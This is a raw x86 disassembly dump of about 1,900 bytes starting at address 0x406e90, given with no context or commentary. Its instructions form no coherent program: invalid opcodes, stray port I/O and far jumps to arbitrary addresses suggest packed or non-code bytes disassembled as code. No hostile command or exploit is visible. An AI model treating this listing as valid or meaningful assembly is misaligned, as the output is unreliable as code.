  406e90:	in     eax,dx
  406e91:	outs   dx,BYTE PTR ds:[esi]
  406e92:	adc    esi,DWORD PTR [ebp+0x7]
  406e95:	ds out 0x3,al
  406e98:	push   edi
  406e99:	into   
  406e9a:	sub    bh,BYTE PTR [ecx-0x65]
  406e9d:	scas   eax,DWORD PTR es:[edi]
  406e9e:	push   ds
  406e9f:	out    dx,eax
  406ea0:	push   edi
  406ea1:	inc    esi
  406ea2:	lea    ecx,[esi+ecx*2-0x74e045b1]
  406ea9:	retf   
  406eaa:	push   ss
  406eab:	je     0x406e70
  406ead:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406eae:	sub    al,0x17
  406eb0:	cli    
  406eb1:	and    esp,DWORD PTR [eax+0x20]
  406eb4:	sbb    eax,0x766e9f12
  406eb9:	fisttp WORD PTR [esi+0x53]
  406ebc:	sub    DWORD PTR [ebx-0x1f],ebx
  406ebf:	mov    esp,0xde2c1ba9
  406ec4:	sbb    DWORD PTR [esi+0x799d1f3d],ebx
  406eca:	outs   dx,BYTE PTR ds:[esi]
  406ecb:	shr    bl,0x78
  406ece:	xor    al,0x7c
  406ed0:	lahf   
  406ed1:	jg     0x406ea7
  406ed3:	popa   
  406ed4:	push   esi
  406ed5:	adc    al,0x3f
  406ed7:	and    DWORD PTR [eax-0x4b],edi
  406eda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406edb:	push   ebp
  406edc:	jmp    0x786ec994
  406ee1:	pop    ebx
  406ee2:	mov    eax,0x9109e57c
  406ee7:	popa   
  406ee8:	stc    
  406ee9:	mov    al,ds:0xc418916
  406eee:	mov    eax,DWORD PTR [ebp-0x34]
  406ef1:	mov    ecx,DWORD PTR [ebp-0x8]
  406ef4:	jmp    0x4073ff
  406ef9:	ror    ecx,1
  406efb:	ror    cl,cl
  406efd:	fcmovu st,st(1)
  406eff:	(bad)  
  406f01:	aas    
  406f02:	scas   eax,DWORD PTR es:[edi]
  406f03:	push   ebp
  406f04:	and    DWORD PTR [edi],0xfffffff2
  406f07:	xor    ebx,DWORD PTR [edx+0x7878d0b4]
  406f0d:	push   0x7c
  406f0f:	js     0x406f89
  406f11:	sub    al,0xe2
  406f13:	in     al,0x7b
  406f15:	(bad)
  406f18:	and    edi,esi
  406f1a:	cdq    
  406f1b:	fist   DWORD PTR [ebp+0x18]
  406f1e:	sub    eax,0xfd467f4a
  406f23:	or     BYTE PTR [esi+0x8],0x21
  406f27:	push   0xffffff87
  406f29:	icebp  
  406f2a:	jge    0x406eb6
  406f2c:	ins    BYTE PTR es:[edi],dx
  406f2d:	add    BYTE PTR [ebx],dh
  406f2f:	and    bh,ch
  406f31:	cmc    
  406f32:	jmp    0x9e0e:0x44b5a0c1
  406f39:	pop    es
  406f3a:	out    0x6d,eax
  406f3c:	pop    ebx
  406f3d:	fldcw  WORD PTR [edi+0x61]
  406f40:	jecxz  0x406eca
  406f42:	jne    0x406f3f
  406f44:	loop   0x406f1c
  406f46:	retf   0x3f90
  406f49:	int    0x5d
  406f4b:	(bad)  
  406f4c:	mov    bh,0x6
  406f4e:	in     al,0x89
  406f50:	cdq    
  406f51:	pusha  
  406f52:	and    al,dl
  406f54:	ror    DWORD PTR ds:0x2d303593,0x76
  406f5b:	les    ecx,FWORD PTR [esi+0xde1d726]
  406f61:	lods   eax,DWORD PTR ds:[esi]
  406f62:	mov    ah,0xe5
  406f64:	lds    eax,FWORD PTR [esi]
  406f66:	push   0xbd192db4
  406f6b:	jl     0x406fbb
  406f6d:	psrlq  mm5,QWORD PTR [edi-0x32]
  406f71:	idiv   al
  406f73:	xlat   BYTE PTR ds:[ebx]
  406f74:	sub    BYTE PTR [ecx+ebp*1-0x554fc3ac],cl
  406f7b:	push   ss
  406f7c:	mov    edi,0xd991a8ef
  406f81:	dec    edx
  406f82:	fs dec ebx
  406f84:	pop    ebx
  406f85:	(bad)  
  406f86:	test   al,0x93
  406f88:	push   ds
  406f89:	imul   esp,DWORD PTR [edi-0x6f097f07],0xbe3be658
  406f93:	ds pusha 
  406f95:	cwde   
  406f96:	out    dx,al
  406f97:	loope  0x406fff
  406f99:	test   al,0x90
  406f9b:	mov    al,0xab
  406f9d:	repz loope 0x406fbe
  406fa0:	out    0xbf,al
  406fa2:	inc    ebx
  406fa3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406fa4:	push   ebx
  406fa5:	lds    ebp,FWORD PTR [eax+0x184164f]
  406fab:	and    esp,DWORD PTR [eax+ebp*1+0x2323ac6a]
  406fb2:	cmp    BYTE PTR [esp+edx*4-0x1e17de61],ch
  406fb9:	leave  
  406fba:	int3   
  406fbb:	and    DWORD PTR [esi+0x191066c3],eax
  406fc1:	jecxz  0x407018
  406fc3:	jnp    0x406f6a
  406fc5:	mov    al,0x72
  406fc7:	pop    ecx
  406fc8:	and    BYTE PTR [eax-0x1ea15d25],ah
  406fce:	push   edx
  406fcf:	mov    ch,0xc6
  406fd1:	mov    esp,DWORD PTR [edi-0x44]
  406fd4:	aam    0xae
  406fd6:	retf   0x82cd
  406fd9:	jg     0x406fde
  406fdb:	(bad)  
  406fdd:	jmp    FWORD PTR [edi+edi*8-0x2187d9fc]
  406fe4:	aaa    
  406fe5:	pop    edi
  406fe6:	outs   dx,BYTE PTR ds:[esi]
  406fe7:	jne    0x406f9d
  406fe9:	in     eax,0xd0
  406feb:	pop    ecx
  406fec:	repz retf 
  406fee:	loopne 0x406fde
  406ff0:	pop    ebx
  406ff1:	jae    0x40705f
  406ff3:	in     eax,dx
  406ff4:	jmp    0x57e6:0xde7eba9a
  406ffb:	inc    ebx
  406ffc:	ja     0x407076
  406ffe:	popa   
  406fff:	(bad)  
  407001:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407002:	test   al,0x76
  407004:	mov    ebp,0x6a5cecf4
  407009:	pushf  
  40700a:	jmp    eax
  40700c:	fsubr  st,st(4)
  40700e:	ret    
  40700f:	adc    al,BYTE PTR [edi+edi*2]
  407012:	add    DWORD PTR [eax+0x51],eax
  407015:	loop   0x407014
  407017:	call   0x38ee:0x14af2737
  40701e:	cmp    dh,BYTE PTR [edx-0x49]
  407021:	jnp    0x40703f
  407023:	jno    0x40700f
  407025:	push   eax
  407026:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407027:	int    0xa7
  407029:	mov    esi,DWORD PTR [ebx-0x34]
  40702c:	in     al,dx
  40702d:	jo     0x407058
  40702f:	cmp    ebx,DWORD PTR [ecx+0x5fd1d121]
  407035:	dec    ebx
  407036:	test   eax,0xa6f0ab18
  40703b:	jnp    0x406fd2
  40703d:	inc    eax
  40703e:	inc    ecx
  40703f:	call   0x9f96:0xbaa90435
  407046:	ret    0xc480
  407049:	inc    edx
  40704a:	aaa    
  40704b:	mov    edi,0x1e7423e5
  407050:	sbb    ch,BYTE PTR [ecx+0x3b38c3eb]
  407056:	pop    ds
  407057:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407058:	sbb    eax,0xe498e944
  40705d:	add    eax,0x2e325c7e
  407062:	dec    esp
  407063:	or     cl,BYTE PTR [ebp+0x74d78f3a]
  407069:	jo     0x407095
  40706b:	arpl   WORD PTR [esi+eax*2+0x5b],bp
  40706f:	pop    ebx
  407070:	mov    ebp,0xb0cd8894
  407075:	and    bh,dh
  407077:	push   esi
  407078:	push   esp
  407079:	xchg   esp,eax
  40707a:	sbb    al,0x55
  40707c:	sbb    esi,DWORD PTR [di-0x6]
  407080:	xchg   DWORD PTR [esp+edx*4],ecx
  407083:	out    dx,al
  407084:	pop    es
  407085:	je     0x4070f7
  407087:	mov    edi,0x7f680318
  40708c:	jb     0x4070a5
  40708e:	xchg   ebp,eax
  40708f:	sub    ah,BYTE PTR [edx-0x5c]
  407092:	and    al,0xaa
  407094:	adc    esp,0xf89e83bd
  40709a:	jge    0x407092
  40709c:	clc    
  40709d:	and    ebx,DWORD PTR [edx]
  40709f:	outs   dx,BYTE PTR ds:[esi]
  4070a0:	gs icebp 
  4070a2:	out    0x15,al
  4070a4:	dec    ebx
  4070a5:	add    BYTE PTR [eax],0x5d
  4070a8:	jne    0x4070ae
  4070aa:	sub    al,0x47
  4070ac:	add    ecx,DWORD PTR [eax+0x67cea95a]
  4070b2:	out    0xc1,eax
  4070b4:	in     al,0xf5
  4070b6:	cld    
  4070b7:	pop    ebx
  4070b8:	xchg   edi,eax
  4070b9:	ret    0xfd6b
  4070bc:	add    eax,0x7cd55352
  4070c1:	adc    dl,BYTE PTR [edx-0x265b0f7c]
  4070c7:	push   ds
  4070c8:	adc    BYTE PTR [esp+ebx*1-0x14320606],ah
  4070cf:	inc    ebp
  4070d0:	push   edx
  4070d1:	adc    eax,0x8e8a8bbd
  4070d6:	sub    eax,0xa7f61442
  4070db:	adc    ah,BYTE PTR [ebx+0x386f184d]
  4070e1:	ins    BYTE PTR es:[edi],dx
  4070e2:	popf   
  4070e3:	mov    WORD PTR [esi+eiz*1-0x3],ds
  4070e7:	push   edi
  4070e8:	sbb    bh,cl
  4070ea:	inc    esi
  4070eb:	xchg   edx,eax
  4070ec:	ret    
  4070ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070ee:	jnp    0x4070c2
  4070f0:	mov    ds:0xd99f6824,al
  4070f5:	or     ebp,DWORD PTR [eax+edi*4-0x74824f06]
  4070fc:	cs fs or eax,0xc5e379e1
  407103:	fdivr  QWORD PTR [eax]
  407105:	cmp    DWORD PTR [ebx],esi
  407107:	in     eax,dx
  407108:	and    ebx,DWORD PTR [ebx+0x29]
  40710b:	aad    0x2d
  40710d:	out    0x7f,eax
  40710f:	ins    DWORD PTR es:[edi],dx
  407110:	into   
  407111:	loop   0x4070f7
  407113:	xchg   ebp,eax
  407114:	fld    TBYTE PTR [ebx+0x1f]
  407117:	mov    bl,0x5a
  407119:	into   
  40711a:	pop    ecx
  40711b:	call   0xdcae:0x192866bc
  407122:	jno    0x407164
  407124:	or     al,0x5e
  407126:	mov    ah,0x9d
  407128:	jmp    FWORD PTR [ebx+0x44eed835]
  40712e:	jmp    0x407140
  407130:	idiv   DWORD PTR [esi-0x1]
  407133:	out    0x74,eax
  407135:	arpl   WORD PTR [ebp+ecx*1-0x5c59af23],di
  40713c:	shl    BYTE PTR [ecx+0x2fcf09d9],cl
  407142:	ret    0xeaf7
  407145:	les    esp,FWORD PTR [ebx]
  407147:	es mov ch,0x28
  40714a:	pop    ds
  40714b:	inc    ebp
  40714c:	cwde   
  40714d:	add    BYTE PTR [ecx+0x61d2d9ce],0x47
  407154:	add    al,0xa5
  407156:	sub    dh,bl
  407158:	enter  0x2d23,0xc9
  40715c:	push   ss
  40715d:	add    al,0x5d
  40715f:	mov    ebp,0x71c78bcc
  407164:	ins    DWORD PTR es:[edi],dx
  407165:	push   edx
  407166:	stos   BYTE PTR es:[edi],al
  407167:	jnp    0x407161
  407169:	pop    edx
  40716a:	les    ebx,FWORD PTR ds:0x5c97b96b
  407170:	rcr    BYTE PTR [ebp-0x56],0x88
  407174:	sub    eax,0x86eccacd
  407179:	out    0xea,al
  40717b:	out    dx,al
  40717c:	jns    0x407174
  40717e:	adc    ebp,DWORD PTR [ebp+0x6f7ea16c]
  407184:	test   BYTE PTR [edi+0x7bc9c4e],0x99
  40718b:	(bad)  
  40718c:	inc    DWORD PTR [eax-0x3b]
  40718f:	test   DWORD PTR [edx],ebp
  407191:	aam    0xa7
  407193:	dec    edi
  407194:	dec    esi
  407195:	frstor [eax-0x13]
  407198:	pop    edx
  407199:	das    
  40719a:	arpl   WORD PTR [ecx],ax
  40719c:	cmp    BYTE PTR [eax],al
  40719e:	icebp  
  40719f:	mov    al,ds:0x55b88c96
  4071a4:	push   edx
  4071a5:	mov    cl,0x48
  4071a7:	cs popa 
  4071a9:	or     ebp,DWORD PTR [ebp+esi*1-0x55f990d]
  4071b0:	push   ebx
  4071b1:	add    eax,0x9d42f753
  4071b6:	call   0xfa8c:0xae8b7e95
  4071bd:	inc    esp
  4071be:	xchg   BYTE PTR [ebp-0x40fc28ea],bl
  4071c4:	imul   ebp,DWORD PTR [edx+0x7d],0x4d054104
  4071cb:	fld    QWORD PTR [ebp-0xc2f28b8]
  4071d1:	jge    0x4071da
  4071d3:	je     0x407163
  4071d5:	cmp    eax,0x42554b07
  4071da:	dec    ecx
  4071db:	adc    al,0xf6
  4071dd:	call   0x10f8:0x8112e3f7
  4071e4:	imul   ebx,DWORD PTR [ebx-0x40a4fb78],0x1a
  4071eb:	pop    esi
  4071ec:	push   es
  4071ed:	or     BYTE PTR [ebp+0x37fd1702],bh
  4071f3:	pushf  
  4071f4:	mov    ds:0x5bc16937,al
  4071f9:	cmp    ax,0xfb73
  4071fd:	in     eax,dx
  4071fe:	push   ecx
  4071ff:	sar    BYTE PTR [edi],cl
  407201:	adc    eax,0x515be93b
  407206:	xor    esi,edi
  407208:	jmp    0x55202fb2
  40720d:	test   DWORD PTR [eax-0xa],edx
  407210:	xor    BYTE PTR [edi],0xb5
  407213:	popf   
  407214:	cli    
  407215:	fmul   DWORD PTR [edi]
  407217:	mov    fs,WORD PTR [eax-0x7e6e7997]
  40721d:	mov    ah,0x82
  40721f:	test   eax,0x15082f45
  407224:	or     BYTE PTR ds:0x72ee5d9,bl
  40722a:	jno    0x40727c
  40722c:	add    BYTE PTR [ebx],al
  40722e:	ds ds aas 
  407231:	mov    al,ds:0x867c7467
  407236:	and    eax,esi
  407238:	pop    eax
  407239:	adc    ebp,ebp
  40723b:	outs   dx,BYTE PTR ds:[esi]
  40723c:	(bad)  
  40723d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40723e:	add    DWORD PTR [edx+0x324e40ac],ebx
  407244:	pop    ss
  407245:	in     al,dx
  407246:	push   ds
  407247:	iret   
  407248:	js     0x4072c5
  40724a:	sub    BYTE PTR [edx+0x5ebd65a3],dh
  407250:	call   0x715e53d0
  407255:	push   ecx
  407256:	pop    edx
  407257:	add    al,0x14
  407259:	fdiv   DWORD PTR [edx-0x379f4e]
  40725f:	js     0x40725f
  407261:	push   eax
  407262:	popa   
  407263:	sbb    al,0x90
  407265:	xchg   al,bh
  407267:	mov    esp,0xbe9f5b01
  40726c:	sbb    ebp,DWORD PTR [edx-0x34f3727b]
  407272:	jecxz  0x4072f2
  407274:	xor    esp,DWORD PTR [ebp+0x79bdce88]
  40727a:	inc    esp
  40727b:	aam    0xa5
  40727d:	and    DWORD PTR [ebx+0x7d],0xffffff8f
  407281:	and    al,0x86
  407283:	mov    esp,0x1fdbfec4
  407288:	lods   al,BYTE PTR ds:[esi]
  407289:	into   
  40728a:	lahf   
  40728b:	and    ecx,0x7fc62bbf
  407291:	nop
  407292:	mov    BYTE PTR [ebx],bh
  407294:	or     BYTE PTR [eax],al
  407296:	jg     0x4072d6
  407298:	fadd   st,st(3)
  40729a:	adc    bh,bh
  40729c:	fs jns 0x407298
  40729f:	pop    esp
  4072a0:	sbb    dh,cl
  4072a2:	xor    BYTE PTR [ebx+eiz*8-0x66],0x3c
  4072a7:	inc    eax
  4072a8:	outs   dx,BYTE PTR ds:[esi]
  4072a9:	mov    WORD PTR [edx-0x8a45e3e],gs
  4072af:	lods   al,BYTE PTR ds:[esi]
  4072b0:	cmp    ch,BYTE PTR [edi+0x7f5ce8d0]
  4072b6:	int    0x91
  4072b8:	mov    edx,DWORD PTR [edi-0x6]
  4072bb:	or     al,0xf9
  4072bd:	stc    
  4072be:	add    al,0x9b
  4072c0:	mov    DWORD PTR [ecx],ebx
  4072c2:	ins    DWORD PTR es:[edi],dx
  4072c3:	inc    edi
  4072c4:	lea    esi,[ebp+eiz*4-0x683c831]
  4072cb:	(bad)  
  4072cc:	push   esi
  4072cd:	sbb    eax,0x523931ae
  4072d2:	std    
  4072d3:	in     eax,dx
  4072d4:	inc    edx
  4072d5:	push   0x4af74352
  4072da:	ffree  st(1)
  4072dc:	retf   0x7bc1
  4072df:	shl    DWORD PTR [esp+eax*4],0xb6
  4072e3:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  4072e5:	inc    BYTE PTR [ecx-0xa]
  4072e8:	pop    edi
  4072e9:	cmp    bh,ch
  4072eb:	push   edi
  4072ec:	push   ds
  4072ed:	stc    
  4072ee:	hlt    
  4072ef:	dec    eax
  4072f0:	test   DWORD PTR [eax],eax
  4072f2:	jbe    0x407295
  4072f4:	retf   0xe5ad
  4072f7:	jmp    0x2960fd86
  4072fc:	mov    DWORD PTR [edx+0x43],esp
  4072ff:	int    0x76
  407301:	into   
  407302:	pop    esp
  407303:	mov    dh,BYTE PTR [ebx-0x5794ad6b]
  407309:	call   0x499835b6
  40730e:	cs cdq 
  407310:	(bad)  
  407311:	(bad)  
  407312:	push   0x2079ea9a
  407317:	push   es
  407318:	mov    edx,?
  40731a:	stos   DWORD PTR es:[edi],eax
  40731b:	jo     0x4072d6
  40731d:	test   DWORD PTR ds:0x5fb511eb,ebp
  407323:	idiv   BYTE PTR [esi]
  407325:	call   0x9948:0x9338aa44
  40732c:	xor    eax,0x587af411
  407331:	rcl    BYTE PTR [ebx],0x65
  407334:	ds xor al,0xf8
  407337:	xor    cl,bh
  407339:	pushf  
  40733a:	dec    eax
  40733b:	mov    ecx,0x47a9b197
  407340:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407341:	ror    BYTE PTR [ebp+esi*8-0xd912d5a],0x7c
  407349:	ret    0xb7f3
  40734c:	lods   eax,DWORD PTR ds:[esi]
  40734d:	fist   WORD PTR [ebx-0x66]
  407350:	and    al,0x71
  407352:	xchg   BYTE PTR [ebp+0x67],ah
  407355:	jmp    0x4072e4
  407357:	jno    0x4073ab
  407359:	and    al,0xb4
  40735b:	out    dx,al
  40735c:	dec    edi
  40735d:	cmp    eax,0x253ab177
  407362:	out    dx,al
  407363:	rcl    DWORD PTR [eax-0x63],cl
  407366:	jp     0x4073d1
  407368:	or     edx,ebp
  40736a:	fcom   st(2)
  40736c:	and    al,al
  40736e:	jbe    0x40736d
  407370:	in     al,dx
  407371:	jg     0x407358
  407373:	pop    ss
  407374:	pop    ecx
  407375:	shr    BYTE PTR [ecx-0x32bb9402],0xfd
  40737c:	pop    eax
  40737d:	cmp    al,0xf4
  40737f:	ret    0x41aa
  407382:	cmp    ecx,edx
  407384:	aaa    
  407385:	ja     0x4073b8
  407387:	ror    DWORD PTR [ecx+0x1],0xab
  40738b:	fidivr DWORD PTR [esi-0x58ada58c]
  407391:	and    al,0x6d
  407393:	in     eax,0x8a
  407395:	loope  0x40737b
  407397:	sar    DWORD PTR [ecx+0x1604bd75],0xea
  40739e:	push   esi
  40739f:	xchg   ebp,eax
  4073a0:	or     eax,0x27775b66
  4073a5:	xchg   edx,eax
  4073a6:	jmp    0x83442a4
  4073ab:	ss pusha 
  4073ad:	push   edi
  4073ae:	or     dh,0x82
  4073b1:	stos   BYTE PTR es:[edi],al
  4073b2:	out    dx,eax
  4073b3:	sub    bh,BYTE PTR [edx+0x24233956]
  4073b9:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073bb:	push   es
  4073bc:	int    0x85
  4073be:	push   edi
  4073bf:	lods   al,BYTE PTR ds:[esi]
  4073c0:	inc    ecx
  4073c1:	dec    edx
  4073c2:	mov    edi,0x8dbb4838
  4073c7:	(bad)  
  4073c9:	jae    0x407430
  4073cb:	jmp    0x3889:0x5009692f
  4073d2:	shl    DWORD PTR [edi-0x218f674d],cl
  4073d8:	sbb    eax,0x16c55b5e
  4073dd:	shl    DWORD PTR [ebx+0x5e],cl
  4073e0:	xor    al,0x86
  4073e2:	cmp    DWORD PTR [ebx+ebx*8],0xdc939566
  4073e9:	scas   al,BYTE PTR es:[edi]
  4073ea:	push   0x7f
  4073ec:	test   ebp,edi
  4073ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073ef:	inc    esi
  4073f0:	inc    esi
  4073f1:	sbb    ch,BYTE PTR [esi]
  4073f3:	fs jl  0x4073db
  4073f6:	mov    DWORD PTR [edi-0x62],ebx
  4073f9:	dec    ebx
  4073fa:	mov    esi,0xffe12367
  4073ff:	mov    DWORD PTR [ecx+0x10],eax
  407402:	mov    eax,eax
  407404:	jmp    0x40790f
  407409:	(bad)  
  40740a:	int    0xd3
  40740c:	rcr    bl,cl
  40740e:	rol    ch,cl
  407410:	fxch   st(2)
  407412:	cmp    eax,0x7cdecccd
  407417:	add    BYTE PTR [ecx],ch
  407419:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40741a:	fstp   TBYTE PTR [eax+0x78]
  40741d:	push   0x7c
  40741f:	js     0x407499
  407421:	loop   0x407497
  407423:	(bad)  
  407424:	mov    bh,0xe5
  407426:	and    eax,0x966ab489
  40742b:	dec    eax
  40742c:	pop    ecx
  40742d:	fldcw  WORD PTR [esi]
  40742f:	repnz aad 0xb3
  407432:	(bad)  
  407434:	jmp    0x4136:0x33b7a7f8
  40743b:	rol    BYTE PTR [edx-0x2de41c9d],cl
  407441:	adc    al,0x37
  407443:	rcr    ebx,0x6b
  407446:	fs cwde 
  407448:	jle    0x4074a6
  40744a:	jnp    0x407407
  40744c:	mov    ds:0x5ee24b90,eax
  407451:	push   0xc104c5dc
  407456:	mov    bl,0x4d
  407458:	push   0x430dc4f0
  40745d:	or     ebx,DWORD PTR [edi+0x3efa1b16]
  407463:	push   esp
  407464:	inc    esi
  407465:	xchg   BYTE PTR [ebp-0x2f195d38],dl
  40746b:	jp     0x407406
  40746d:	in     eax,0xd4
  40746f:	sub    esi,DWORD PTR [esi]
  407471:	fwait
  407472:	push   edx
  407473:	xchg   esi,eax
  407474:	xchg   ecx,eax
  407475:	dec    edi
  407476:	in     al,0x4d
  407478:	out    0xc2,al
  40747a:	call   0x351d:0x71242fdc
  407481:	scas   al,BYTE PTR es:[edi]
  407482:	mov    edx,0x38d9940e
  407487:	mov    ds:0x138d842f,eax
  40748c:	mov    ecx,0x662b5286
  407491:	in     al,dx
  407492:	lea    ecx,[eax+0x60]
  407495:	dec    esp
  407496:	(bad)  
  407497:	pop    edx
  407498:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407499:	scas   eax,DWORD PTR es:[edi]
  40749a:	lahf   
  40749b:	das    
  40749c:	stos   DWORD PTR es:[edi],eax
  40749d:	mov    ebp,0xed72ca0f
  4074a2:	cmp    DWORD PTR [ebx+0x26],0xf52055fe
  4074a9:	sbb    esp,edi
  4074ab:	or     al,0x44
  4074ad:	mov    cl,0x27
  4074af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074b0:	or     BYTE PTR [edx+0x4b],bh
  4074b3:	pop    edx
  4074b4:	push   edi
  4074b5:	push   0x98c05dae
  4074ba:	pop    eax
  4074bb:	sbb    esi,eax
  4074bd:	out    0xb1,al
  4074bf:	imul   eax,DWORD PTR [esi],0x8d05bf4b
  4074c5:	iret   
  4074c6:	mov    ds:0xbd60b08a,eax
  4074cb:	mov    esp,0x390fea08
  4074d0:	xchg   ebp,eax
  4074d1:	aaa    
  4074d2:	adc    DWORD PTR [ebx+0x2a],0xffffff94
  4074d6:	iret   
  4074d7:	mov    ecx,0xfee5ae4d
  4074dc:	(bad)  
  4074dd:	mov    al,0x30
  4074df:	repnz mov al,ds:0x783157a1
  4074e5:	pushf  
  4074e6:	cs fld st(7)
  4074e9:	add    BYTE PTR [ecx-0x2d41260b],cl
  4074ef:	dec    esi
  4074f0:	sub    dl,BYTE PTR [ecx-0x77a56cae]
  4074f6:	dec    esi
  4074f7:	mov    ecx,DWORD PTR [esi-0x79f6f256]
  4074fd:	cdq    
  4074fe:	int    0xdb
  407500:	cmp    ebx,DWORD PTR [esi]
  407502:	xchg   edi,eax
  407503:	test   esp,ebx
  407505:	xchg   esi,eax
  407506:	stos   DWORD PTR es:[edi],eax
  407507:	adc    BYTE PTR [edx-0x49],0xe1
  40750b:	add    eax,0xa8814715
  407510:	cli    
  407511:	aaa    
  407512:	fadd   DWORD PTR [eax+0x45c147e8]
  407518:	cmp    edx,DWORD PTR [edi+0x404950e0]
  40751e:	xor    DWORD PTR [esi-0x35],eax
  407521:	pusha  
  407522:	aam    0xe3
  407524:	dec    ebx
  407525:	dec    ebx
  407526:	push   0xffffffcc
  407528:	ins    BYTE PTR es:[edi],dx
  407529:	or     BYTE PTR [ecx],dl
  40752b:	lods   eax,DWORD PTR ds:[esi]
  40752c:	push   ebx
  40752d:	aaa    
  40752e:	fs mov al,bl
  407531:	xchg   BYTE PTR [edx+0x36],dl
  407534:	repnz mov DWORD PTR [bx+0x3a],esp
  407539:	sbb    al,0x4
  40753b:	loopne 0x407583
  40753d:	adc    eax,0x391a2480
  407542:	or     dl,dl
  407544:	pusha  
  407545:	in     eax,0xf3
  407547:	cmc    
  407548:	mov    ecx,0x52f78edb
  40754d:	(bad)  
  40754f:	ins    DWORD PTR es:[edi],dx
  407550:	push   esp
  407551:	push   ss
  407552:	and    dh,dh
  407554:	enter  0x470f,0xdb
  407558:	push   ebp
  407559:	bnd jmp 0xc760e419
  40755f:	xchg   ebp,eax
  407560:	fiadd  DWORD PTR [eax-0x29b53cdf]
  407566:	adc    eax,0x4ddb6346
  40756b:	mov    bl,0xef
  40756d:	pop    ds
  40756e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40756f:	mov    ds:0xcb0531f9,al
  407574:	sti    
  407575:	test   eax,0x7f1c0088
  40757a:	jmp    0x48fa:0x8cdfcd5
  407581:	inc    ebx
  407582:	rcr    DWORD PTR [eax],1
  407584:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407585:	mov    dl,0xac
  407587:	sbb    al,0x20
  407589:	push   edi
  40758a:	dec    edx
  40758b:	out    dx,al
  40758c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40758d:	lods   eax,DWORD PTR ds:[esi]
  40758e:	push   ebx
  40758f:	cmp    eax,0x2069552d
  407594:	sbb    ah,BYTE PTR [edx+0x0]
  407597:	int    0x15
  407599:	pop    edx
  40759a:	sti    
  40759b:	and    ah,dh
  40759d:	push   ecx
  40759e:	rcr    BYTE PTR [esi-0x7ca49b8b],cl
  4075a4:	(bad)  
  4075a6:	(bad)  
  4075a7:	mov    ds:0x77d7aaa7,eax
  4075ac:	jo     0x4075be
  4075ae:	loop   0x407541
  4075b0:	ja     0x407561
  4075b2:	into   
  4075b3:	dec    esi
  4075b4:	popf   
  4075b5:	arpl   WORD PTR [ecx-0x6a],cx
  4075b8:	sub    bl,BYTE PTR ds:0xe827a1f9
  4075be:	xor    BYTE PTR [ebp+0x4171d98e],dh
  4075c4:	adc    dh,cl
  4075c6:	jmp    0xaea00d75
  4075cb:	xor    eax,DWORD PTR [edx]
  4075cd:	sar    DWORD PTR [edi],1
  4075cf:	xor    al,0xc6
  4075d1:	jl     0x407648
  4075d3:	xchg   DWORD PTR [edi],edi
  4075d5:	mov    bl,0x8c
  4075d7:	xlat   BYTE PTR ds:[ebx]
  4075d8:	mov    WORD PTR [ebx-0x70],ss
  4075db:	sub    BYTE PTR [ebp+0x7ccbe074],0x57
  4075e2:	fwait
  4075e3:	sbb    eax,0x1dbcb8df
  4075e8:	stos   BYTE PTR es:[edi],al
  4075e9:	inc    esi
  4075ea:	cs enter 0x9eae,0x65
  4075ef:	daa    
  4075f0:	mov    eax,ds:0x72670f50
  4075f5:	sub    ch,BYTE PTR [eax-0x2645fb71]
  4075fb:	rcl    bl,0x91
  4075fe:	sar    DWORD PTR [eax],cl
  407600:	aas    
  407601:	sbb    al,0x59
  407603:	fadd   QWORD PTR [eax-0x7f]
  407606:	and    edi,eax
  407608:	and    esp,DWORD PTR [ebp-0x676af8bb]
  40760e:	adc    al,0xa3
  407610:	pop    esi
  407611:	dec    edi
  407612:	int3   
  407613:	(bad)  
  407614:	mov    ebp,0xe4224205
  407619:	adc    edx,DWORD PTR [eax+eax*1+0x403f49ed]
  407620:	inc    ebp
  407621:	test   al,0xab
  407624:	dec    eax
  407625:	cmp    al,0x5c
  407627:	fst    DWORD PTR ds:[esi]
  40762a:	sub    eax,0x50a2c9d3
  40762f:	jo     0x40766c
  407631:	xchg   ebp,eax
  407632:	mov    al,ds:0xb370a2af
  407637:	adc    esi,DWORD PTR [ebx-0x7b]
  40763a:	stos   BYTE PTR es:[edi],al
  40763b:	pop    ecx
  40763c:	call   0x297d:0x49818780
  407643:	jo     0x40762e
  407645:	ja     0x40763b
  407647:	xchg   ecx,eax
  407648:	jge    0x4076a1
  40764a:	add    DWORD PTR [edi],ecx
  40764c:	mov    BYTE PTR [edx],bh
  40764e:	leave  
  40764f:	addr16 retf 
  407651:	mov    esi,0xc5251207
  407656:	sti    
  407657:	xlat   BYTE PTR ds:[ebx]
  407658:	xchg   ecx,eax
  407659:	sti    
  40765a:	jmp    0x8e33:0x3574cbe9
  407661:	push   esp
  407662:	jb     0x40761a
  407664:	pop    ebp
  407665:	adc    DWORD PTR [edx],ebx
  407667:	or     al,0x46
  407669:	fnsave [esi]
  40766b:	dec    ebp
  40766c:	(bad)  
  40766d:	call   0xc557a08a
  407672:	mov    esi,DWORD PTR [ecx+0x24]
  407675:	hlt    
  407676:	test   esi,edx
  407678:	ins    DWORD PTR es:[edi],dx
  407679:	mov    esp,0x6ac70d7c
  40767e:	push   0xffffffe0
  407680:	nop
  407681:	push   esi
  407682:	test   ah,ch
  407684:	xchg   dl,dl
  407686:	mov    eax,0x3fb38e5e
  40768b:	lahf   
  40768c:	ret    
  40768d:	test   al,0xe3
  40768f:	clc    
  407690:	das    
  407691:	into   
  407692:	adc    bl,BYTE PTR ds:0xa1d26471
  407698:	mov    ds:0x3213b4e9,al
  40769d:	jb     0x4076d5
